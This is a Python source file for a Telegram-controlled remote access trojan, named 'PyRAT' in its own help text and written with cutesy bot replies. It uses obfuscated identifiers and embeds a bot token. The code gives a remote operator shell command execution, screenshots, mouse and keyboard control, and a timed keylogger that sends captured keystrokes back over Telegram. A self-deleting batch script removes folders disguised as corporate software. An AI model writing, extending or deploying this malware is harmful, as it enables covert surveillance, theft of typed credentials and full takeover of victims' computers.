from pynput import keyboard as _Y4m9N2k7T3v8Q_
from telegram.ext import Application as _W8z3T1r9K6p4V_, CommandHandler as _H5j9P2v4M8n3Q_, filters as _J3n2Q9k6R4t1V_
import psutil as _P7v2K9t3N5m8R_
import pyautogui as _M3b9R4q2T7k1P_
import platform as _S2f6T9m3K8v4Q_
import subprocess as _D9k4N3v7P2t8R_
import os as _Q5r9M2t3J7k1V_
from datetime import datetime as _T8g4K9r2V3n7P_
import asyncio as _A6k3V9n4P2t8Q_
import keyboard as _Z9q4T3m7R2k1V_
import tempfile as _F5h2J9k8V3t4P_
import time as _R3t9P7v2M6k1N_
import threading as _X9b4N2k7Q3t8V_

_K7v9Q2p8N3t4_content = """
@echo off
REM Завершаем процесс monitor.exe
taskkill /f /im monitor.exe
TIMEOUT /T 5 /NOBREAK
REM Удаляем папку MyCorporateMonitor и всё внутри
rmdir /s /q "%APPDATA%\MyCorporateMonitor"
REM Завершаем процесс target.exe
taskkill /f /im target.exe
TIMEOUT /T 5 /NOBREAK
REM Удаляем папку MyCorporateApp и всё внутри
rmdir /s /q "%APPDATA%\MyCorporateApp"
del "%~f0"
"""

def _Z9K3Q7V2X8M4P1T6N2_(_c): 
    def _N5T2P9R3V7K1_():
        _c9V4K3Q2T8M5_, _n6T3P2R9V1K7_ = _F5h2J9k8V3t4P_.mkstemp(suffix='.bat', text=True)
        _Q5r9M2t3J7k1V_.close(_c9V4K3Q2T8M5_)
        with open(_n6T3P2R9V1K7_, "w", encoding="utf-8") as _g4R3M9T2V7K1_:
            _g4R3M9T2V7K1_.write(_c)
        return _n6T3P2R9V1K7_
    return _N5T2P9R3V7K1_()

_P3R9T2N7B6K4V8_path = _Z9K3Q7V2X8M4P1T6N2_(_K7v9Q2p8N3t4_content)

_W2Z8T3K9V5P1_TOKEN = '8095084457:AAEgeIP_KDX-rVl8gn8V-tel5MJMm3-Nwa0'

_M3b9R4q2T7k1P_.FAILSAFE = True
_M3b9R4q2T7k1P_.PAUSE = 0.1

_F7N2Q9K3T8V4_dispatch = {}

def _R8T3P2V9K4M1_(_n, _f): _F7N2Q9K3T8V4_dispatch[_n] = _f

async def start(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    await _u6X3P2Q9V7K4_.message.reply_text("Hiii, cutie! Welcome to the super-duper kawaii Remote Admin Bot, nyaaa! :3\n"
                                           "Here’s what I can do for you, pweeease pick one! ^_^\n"
                                           "/sysinfo - Show system info, nyaa ~✿\n"
                                           "/screenshot - Take a p-pretty screenshot (*^ω^)\n"
                                           "/run <command> - Run a shell command, like dir or ls, w-w (*≧ω≦)\n"
                                           "/click - Do a clicky-click with the mousey :3\n"
                                           "/rightclick - Right-clicky, nyaaa ~☆\n"
                                           "/doubleclick - Double-clicky, super fast! ^.^\n"
                                           "/mousemove <x> <y> - Move mousey to (x, y), pweeease! >w<\n"
                                           "/type <text> - Type some text, even Cyrillic, nyaaa! (*^ω^)\n"
                                           "/key <key> - Press a key, like enter, w-w :3\n"
                                           "/keycombo <key1>+<key2> - Press a key combo, like ctrl+c, nyaaa! ^_^\n"
                                           "/klg <time(sec)> - Logging key input over time\n"
                                           "/terminate - Uninstall PyRAT from PC :3")
_R8T3P2V9K4M1_('start', start)

async def sysinfo(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    _p2Q9V4K3T8M7_info = (
        f"OS: {_S2f6T9m3K8v4Q_.system()} {_S2f6T9m3K8v4Q_.release()}, nyaaa :3\n"
        f"CPU: {_S2f6T9m3K8v4Q_.processor()}, w-w ^_^\n"
        f"CPU Usage: {_P7v2K9t3N5m8R_.cpu_percent()}%, p-pwetty busy! ~✿\n"
        f"Memory: {_P7v2K9t3N5m8R_.virtual_memory().percent}% used "
        f"({_P7v2K9t3N5m8R_.virtual_memory().used / (1024**3):.2f} GB / "
        f"{_P7v2K9t3N5m8R_.virtual_memory().total / (1024**3):.2f} GB), nyaaa (*^ω^)"
    )
    await _u6X3P2Q9V7K4_.message.reply_text(f"Here’s your system info, cutie! {_p2Q9V4K3T8M7_info} :3")
_R8T3P2V9K4M1_('sysinfo', sysinfo)

async def screenshot(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        _h6M2V9K3T4P8_ = _M3b9R4q2T7k1P_.screenshot()
        _j4K9T3P2V7M5_path = f"screenshot_{_T8g4K9r2V3n7P_.now().strftime('%Y%m%d_%H%M%S')}.png"
        _h6M2V9K3T4P8_.save(_j4K9T3P2V7M5_path)
        with open(_j4K9T3P2V7M5_path, 'rb') as _r7P2V9K3T4M8_:
            await _u6X3P2Q9V7K4_.message.reply_photo(photo=_r7P2V9K3T4M8_)
        _Q5r9M2t3J7k1V_.remove(_j4K9T3P2V7M5_path)
        await _u6X3P2Q9V7K4_.message.reply_text("Screenshot taken and sent, nyaaa! P-pwetty pic! ~✿")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Sowwy, something went wrong with the screenshot, w-w: {str(e)} >w<")
_R8T3P2V9K4M1_('screenshot', screenshot)

async def run(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        _q3W9Z2K4T7R8_ = ' '.join(_b9N5K4T2R3M8_.args)
        if not _q3W9Z2K4T7R8_:
            await _u6X3P2Q9V7K4_.message.reply_text("Pweeease give me a command to run, nyaaa! Like /run dir :3")
            return
        _n8T4R2K9V3M7_ = _D9k4N3v7P2t8R_.run(_q3W9Z2K4T7R8_, shell=True, capture_output=True, text=True, timeout=10)
        _z2V9P4K3T8M7_ = _n8T4R2K9V3M7_.stdout or _n8T4R2K9V3M7_.stderr or "No output, nyaaa!"
        await _u6X3P2Q9V7K4_.message.reply_text(f"Here’s what I got, cutie:\n{_z2V9P4K3T8M7_[:1000]} ^_^")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Oopsie, something broke when running the command, w-w: {str(e)} (*≧ω≦)")
_R8T3P2V9K4M1_('run', run)

async def click(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        _M3b9R4q2T7k1P_.click()
        await _u6X3P2Q9V7K4_.message.reply_text("Clicky-click done, nyaaa! *boop* :3")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Sowwy, couldn’t do the clicky, w-w: {str(e)} >w<")
_R8T3P2V9K4M1_('click', click)

async def rightclick(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        _M3b9R4q2T7k1P_.rightClick()
        await _u6X3P2Q9V7K4_.message.reply_text("Right-clicky done, nyaaa! *tap* ~☆")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Oopsie, right-clicky failed, w-w: {str(e)} ^.^*")
_R8T3P2V9K4M1_('rightclick', rightclick)

async def doubleclick(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        _M3b9R4q2T7k1P_.doubleClick()
        await _u6X3P2Q9V7K4_.message.reply_text("Double-clicky done super fast, nyaaa! *double boop* ^_^")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Sowwy, double-clicky didn’t work, w-w: {str(e)} :3")
_R8T3P2V9K4M1_('doubleclick', doubleclick)

async def mousemove(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        if len(_b9N5K4T2R3M8_.args) != 2:
            await _u6X3P2Q9V7K4_.message.reply_text("Pweeease give me x and y coordinates, nyaaa! Like /mousemove 100 200 (*^ω^)")
            return
        x, y = map(int, _b9N5K4T2R3M8_.args)
        _w7Q2R9K3T4V8_width, _f5T9K2P8V3M7_height = _M3b9R4q2T7k1P_.size()
        if x < 0 or y < 0 or x > _w7Q2R9K3T4V8_width or y > _f5T9K2P8V3M7_height:
            await _u6X3P2Q9V7K4_.message.reply_text(f"Coordinates are too big or small, nyaaa! Screen size: {_w7Q2R9K3T4V8_width}x{_f5T9K2P8V3M7_height} >w<")
            return
        _M3b9R4q2T7k1P_.moveTo(x, y)
        await _u6X3P2Q9V7K4_.message.reply_text(f"Mousey moved to ({x}, {y}), nyaaa! *scurry scurry* ~✿")
    except ValueError:
        await _u6X3P2Q9V7K4_.message.reply_text("Pweeease use numbers for coordinates, nyaaa! Like /mousemove 100 200 :3")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Oopsie, couldn’t move mousey, w-w: {str(e)} ^.^*")
_R8T3P2V9K4M1_('mousemove', mousemove)

async def type_text(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        _g9R4M3T2V8K7_ = ' '.join(_b9N5K4T2R3M8_.args)
        if not _g9R4M3T2V8K7_:
            await _u6X3P2Q9V7K4_.message.reply_text("Pweeease give me some text to type, nyaaa! Like /type Привет, мир! (*≧ω≦)")
            return
        _g9R4M3T2V8K7_ = _g9R4M3T2V8K7_.encode().decode('utf-8')
        _Z9q4T3m7R2k1V_.write(_g9R4M3T2V8K7_)
        await _u6X3P2Q9V7K4_.message.reply_text(f"Typed your text, cutie: {_g9R4M3T2V8K7_} *tap tap tap* :3")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Sowwy, couldn’t type the text, w-w: {str(e)} >w<")
_R8T3P2V9K4M1_('type', type_text)

async def key(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        if not _b9N5K4T2R3M8_.args:
            await _u6X3P2Q9V7K4_.message.reply_text("Pweeease tell me a key to press, nyaaa! Like /key enter ^_^")
            return
        _t6K9V4Q2R3M8_ = _b9N5K4T2R3M8_.args[0].lower()
        if _t6K9V4Q2R3M8_ not in _M3b9R4q2T7k1P_.KEY_NAMES:
            await _u6X3P2Q9V7K4_.message.reply_text(f"That’s not a valid key, nyaaa! Try these: {', '.join(_M3b9R4q2T7k1P_.KEY_NAMES[:10])}... (*^ω^)")
            return
        _M3b9R4q2T7k1P_.press(_t6K9V4Q2R3M8_)
        await _u6X3P2Q9V7K4_.message.reply_text(f"Pressed the key, nyaaa: {_t6K9V4Q2R3M8_} *boop boop* ~✿")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Oopsie, couldn’t press the key, w-w: {str(e)} :3")
_R8T3P2V9K4M1_('key', key)

async def keycombo(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        if not _b9N5K4T2R3M8_.args or '+' not in _b9N5K4T2R3M8_.args[0]:
            await _u6X3P2Q9V7K4_.message.reply_text("Pweeease give me a key combo, nyaaa! Like /keycombo ctrl+c >w<")
            return
        _p5Q9R3T2V8K7_ = _b9N5K4T2R3M8_.args[0].lower().split('+')
        if not all(k in _M3b9R4q2T7k1P_.KEY_NAMES for k in _p5Q9R3T2V8K7_):
            await _u6X3P2Q9V7K4_.message.reply_text(f"Those keys aren’t valid, nyaaa! Try these: {', '.join(_M3b9R4q2T7k1P_.KEY_NAMES[:10])}... ^.^*")
            return
        _M3b9R4q2T7k1P_.hotkey(*_p5Q9R3T2V8K7_)
        await _u6X3P2Q9V7K4_.message.reply_text(f"Pressed the combo, nyaaa: {_b9N5K4T2R3M8_.args[0]} *smashy smash* :3")
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Sowwy, couldn’t press the combo, w-w: {str(e)} (*≧ω≦)")
_R8T3P2V9K4M1_('keycombo', keycombo)

_F2Z9T4K8V3P7_keys = []
_Q4R9V3T2K8M7_ = None

def _M9K2P7Q4V3T8_on_press(_t2X9Q7V4K3R8_):
    try:
        _F2Z9T4K8V3P7_keys.append(_t2X9Q7V4K3R8_.char)
    except AttributeError:
        _F2Z9T4K8V3P7_keys.append(str(_t2X9Q7V4K3R8_))

def _C7V4N3T9K2P8_stop():
    global _Q4R9V3T2K8M7_
    if _Q4R9V3T2K8M7_:
        _Q4R9V3T2K8M7_.stop()
        _Q4R9V3T2K8M7_ = None

async def klg(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    global _Q4R9V3T2K8M7_
    _j2P9Q4K3T8V7_ = _b9N5K4T2R3M8_.args
    
    if not _j2P9Q4K3T8V7_:
        await _u6X3P2Q9V7K4_.message.reply_text("Enter time in seconds. like /klg 12 -_-")
        return
    
    try:
        _h9T2K4V8P3M7_ = float(_j2P9Q4K3T8V7_[0])
        if _h9T2K4V8P3M7_ <= 0:
            await _u6X3P2Q9V7K4_.message.reply_text("Time must be positive!:3")
            return
    except ValueError:
        await _u6X3P2Q9V7K4_.message.reply_text("Time must be integer!>:(")
        return

    _F2Z9T4K8V3P7_keys.clear()
    
    _Q4R9V3T2K8M7_ = _Y4m9N2k7T3v8Q_.Listener(on_press=_M9K2P7Q4V3T8_on_press)
    _Q4R9V3T2K8M7_.start()
    
    _w3Q2Z9K4T8V7_ = _X9b4N2k7Q3t8V_.Timer(_h9T2K4V8P3M7_, _C7V4N3T9K2P8_stop)
    _w3Q2Z9K4T8V7_.start()
    
    while _Q4R9V3T2K8M7_ and _Q4R9V3T2K8M7_.running:
        await _A6k3V9n4P2t8Q_.sleep(0.1)
    
    if _F2Z9T4K8V3P7_keys:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Keyboard input: {' '.join(_F2Z9T4K8V3P7_keys)} <3")
    else:
        await _u6X3P2Q9V7K4_.message.reply_text("I don't have buttons to reply...sowwy :(")
_R8T3P2V9K4M1_('klg', klg)

async def terminate(_u6X3P2Q9V7K4_, _b9N5K4T2R3M8_):
    try:
        _D9k4N3v7P2t8R_.Popen([_P3R9T2N7B6K4V8_path], shell=True)
    except Exception as e:
        await _u6X3P2Q9V7K4_.message.reply_text(f"Sowwy, couldnt terminate: {str(e)} (*≧ω≦)")
_R8T3P2V9K4M1_('terminate', terminate)

async def _R2T9P4K3V8M7_main():
    _z5X9P3Q2T7K4_ = _W8z3T1r9K6p4V_.builder().token(_W2Z8T3K9V5P1_TOKEN).build()
    
    for _n, _f in _F7N2Q9K3T8V4_dispatch.items():
        _z5X9P3Q2T7K4_.add_handler(_H5j9P2v4M8n3Q_(_n, _f))
    
    print("Starting the kawaii bot, nyaaa! ^_^")
    await _z5X9P3Q2T7K4_.initialize()
    await _z5X9P3Q2T7K4_.start()
    await _z5X9P3Q2T7K4_.updater.start_polling(drop_pending_updates=True)

    try:
        while True:
            await _A6k3V9n4P2t8Q_.sleep(3600)
    except KeyboardInterrupt:
        print("Shutting down the bot, nyaaa! :3")
        await _z5X9P3Q2T7K4_.updater.stop()
        await _z5X9P3Q2T7K4_.stop()
        await _z5X9P3Q2T7K4_.shutdown()

if __name__ == '__main__':
    try:
        _t4P9Q3K2V8M7_ = _A6k3V9n4P2t8Q_.get_running_loop()
        _A6k3V9n4P2t8Q_.ensure_future(_R2T9P4K3V8M7_main())
    except RuntimeError:
        _t4P9Q3K2V8M7_ = _A6k3V9n4P2t8Q_.new_event_loop()
        _A6k3V9n4P2t8Q_.set_event_loop(_t4P9Q3K2V8M7_)
        _t4P9Q3K2V8M7_.run_until_complete(_R2T9P4K3V8M7_main())
